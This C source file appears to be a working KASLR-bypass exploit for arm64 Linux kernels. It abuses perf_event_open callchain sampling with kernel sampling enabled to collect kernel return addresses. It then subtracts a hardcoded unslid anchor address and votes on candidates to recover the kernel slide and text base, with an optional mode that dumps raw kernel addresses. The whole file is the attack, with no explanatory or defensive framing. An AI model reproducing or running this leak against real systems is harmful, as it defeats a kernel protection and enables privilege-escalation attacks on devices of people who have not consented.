#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>

#define ANCHOR_UNSLID 0xffffffc00802e2bcULL
#define TEXT_BASE_UNSLID 0xffffffc008000000ULL
#define SLIDE_ALIGN 0x200000ULL
#define SLIDE_MAX 0x100000000000ULL
#define KERNEL_VA_MIN 0xffffff0000000000ULL

static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu,
                      int group_fd, unsigned long flags) {
  return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

static uint64_t now_us(void) {
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return (uint64_t)ts.tv_sec * 1000000ULL + (uint64_t)ts.tv_nsec / 1000ULL;
}

#define MAX_CAND 4096
struct cand { uint64_t val; unsigned votes; };

int main(int argc, char **argv) {
  long dur_us = argc > 1 ? atol(argv[1]) : 1500000;
  unsigned min_votes = argc > 2 ? (unsigned)atol(argv[2]) : 25;

  struct perf_event_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.type = PERF_TYPE_SOFTWARE;
  attr.config = PERF_COUNT_SW_TASK_CLOCK;
  attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN;
  attr.sample_period = 8000;
  attr.disabled = 1;
  attr.inherit = 0;
  attr.exclude_kernel = 0;
  attr.exclude_hv = 1;

  int fd = (int)perf_open(&attr, 0, -1, -1, 0);
  if (fd < 0) {
    fprintf(stderr, "perf_event_open failed errno=%d (paranoid/SELinux?)\n",
            errno);
    return 2;
  }

  size_t ring_sz = (size_t)(1 + 256) * 4096;
  unsigned char *ring = mmap(NULL, ring_sz, PROT_READ | PROT_WRITE,
                             MAP_SHARED, fd, 0);
  if (ring == MAP_FAILED) {
    fprintf(stderr, "mmap ring failed errno=%d\n", errno);
    return 2;
  }
  struct perf_event_mmap_page *pc = (struct perf_event_mmap_page *)ring;

  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

  uint64_t deadline = now_us() + (uint64_t)dur_us;
  volatile long sink = 0;
  while (now_us() < deadline) {
    for (int i = 0; i < 64; i++) {
      sink += syscall(SYS_getpid);
    }
  }

  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  uint64_t data_head = __atomic_load_n(&pc->data_head, __ATOMIC_ACQUIRE);
  uint64_t data_tail = pc->data_tail;
  size_t data_sz = ring_sz - (size_t)pc->data_offset;
  unsigned char *base = ring + pc->data_offset;

  struct cand cands[MAX_CAND];
  unsigned ncand = 0;
  unsigned nsamples = 0, nkernel_entries = 0;
  static uint64_t cands_raw[4096];
  unsigned ncand_raw_n = 0;

  while (data_tail < data_head) {
    uint64_t off = data_tail % data_sz;
    struct perf_event_header *hdr =
        (struct perf_event_header *)(base + off);
    unsigned char rec[4096];
    uint64_t rec_sz = hdr->size;
    if (rec_sz > sizeof(rec)) {
      break;
    }
    uint64_t first = data_sz - off;
    if (first >= rec_sz) {
      memcpy(rec, base + off, rec_sz);
    } else {
      memcpy(rec, base + off, first);
      memcpy(rec + first, base, rec_sz - first);
    }
    data_tail += rec_sz;
    hdr = (struct perf_event_header *)rec;
    if (hdr->type != PERF_RECORD_SAMPLE) {
      continue;
    }
    nsamples++;
    unsigned char *p = rec + sizeof(*hdr);
    uint64_t ip;
    memcpy(&ip, p, 8); p += 8;
    (void)ip;
    uint64_t nr;
    memcpy(&nr, p, 8); p += 8;
    if (nr > 128) {
      continue;
    }
    for (uint64_t i = 0; i < nr; i++) {
      uint64_t e;
      memcpy(&e, p, 8); p += 8;
      if (e < KERNEL_VA_MIN) {
        continue;
      }
      nkernel_entries++;
      if (ncand_raw_n < 4096) {
        cands_raw[ncand_raw_n++] = e;
      }
      uint64_t cand = e - ANCHOR_UNSLID;
      if (cand >= SLIDE_MAX || (cand & (SLIDE_ALIGN - 1)) != 0) {
        continue;
      }
      unsigned found = 0;
      for (unsigned c = 0; c < ncand; c++) {
        if (cands[c].val == cand) {
          cands[c].votes++;
          found = 1;
          break;
        }
      }
      if (!found && ncand < MAX_CAND) {
        cands[ncand].val = cand;
        cands[ncand].votes = 1;
        ncand++;
      }
    }
  }
  __atomic_store_n(&pc->data_tail, data_tail, __ATOMIC_RELEASE);
  close(fd);

  if (getenv("PERF_SLIDE_DIAG")) {
    struct { uint64_t mod; unsigned n; } mods[1024];
    unsigned nmods = 0;
    for (unsigned c = 0; c < ncand_raw_n; c++) {
      uint64_t m = cands_raw[c] & 0x1fffffULL;
      unsigned f = 0;
      for (unsigned k = 0; k < nmods; k++) {
        if (mods[k].mod == m) { mods[k].n++; f = 1; break; }
      }
      if (!f && nmods < 1024) { mods[nmods].mod = m; mods[nmods].n = 1; nmods++; }
    }
    for (unsigned k = 0; k < nmods && k < 24; k++) {
      unsigned bi = k;
      for (unsigned j = k + 1; j < nmods; j++) {
        if (mods[j].n > mods[bi].n) bi = j;
      }
      uint64_t tm = mods[k].mod; unsigned tn = mods[k].n;
      mods[k].mod = mods[bi].mod; mods[k].n = mods[bi].n;
      mods[bi].mod = tm; mods[bi].n = tn;
    }
    for (unsigned k = 0; k < nmods && k < 24; k++) {
      fprintf(stderr, "mod=0x%06llx n=%u\n",
              (unsigned long long)mods[k].mod, mods[k].n);
    }
    for (unsigned r = 0; r < ncand_raw_n && r < 24; r++) {
      fprintf(stderr, "raw[%u]=0x%016llx\n", r,
              (unsigned long long)cands_raw[r]);
    }
  }

  unsigned best = 0;
  for (unsigned c = 1; c < ncand; c++) {
    if (cands[c].votes > cands[best].votes) {
      best = c;
    }
  }
  fprintf(stderr, "samples=%u kernel_entries=%u candidates=%u\n", nsamples,
          nkernel_entries, ncand);
  if (ncand == 0 || cands[best].votes < min_votes) {
    fprintf(stderr, "no confident slide (best votes=%u need=%u)\n",
            ncand ? cands[best].votes : 0, min_votes);
    return 1;
  }
  uint64_t slide = cands[best].val;
  printf("SLIDE=%llu\n", (unsigned long long)slide);
  printf("TEXT=0x%016llx\n",
         (unsigned long long)(TEXT_BASE_UNSLID + slide));
  return 0;
}
